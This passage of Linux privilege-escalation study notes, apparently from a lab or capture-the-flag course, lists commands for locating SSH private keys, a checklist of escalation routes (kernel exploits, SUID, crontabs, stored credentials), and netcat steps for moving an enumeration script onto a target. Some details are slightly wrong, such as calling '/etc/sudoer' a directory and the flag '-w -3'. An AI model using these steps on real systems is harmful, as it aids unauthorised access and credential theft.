```
echo $0
```
Find file containing ssh keys:
```
find / -name id_rsa 2> /dev/null
```
Priv Esc checklist:
```
1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
2. Locating other services running or applications installed that may be abusable (SUID & out of date software)
3. Looking for automated scripts like backup scripts (exploiting crontabs)
4. Credentials (user accounts, application config files..)
5. Mis-configured file and directory permissions
```
Directory with sudoers:
<br>`/etc/sudoer`<br>
Turn the machine into a web server:
```
python3 -m http.server 8080
```
Listen to incoming files:
```
nc -l -p 1337 > LinEnum.sh
```
Send a file to vlnerable instance:
```
nc -w -3 MACHINE_IP 1337 < LinEnum.sh
```
Add execution permissions on vulnerable instance:
```
chmod +x LinEnum.sh
```
Logs of ssh key:
<br>`/var/log/auth.log`<br>
Logs of system events:
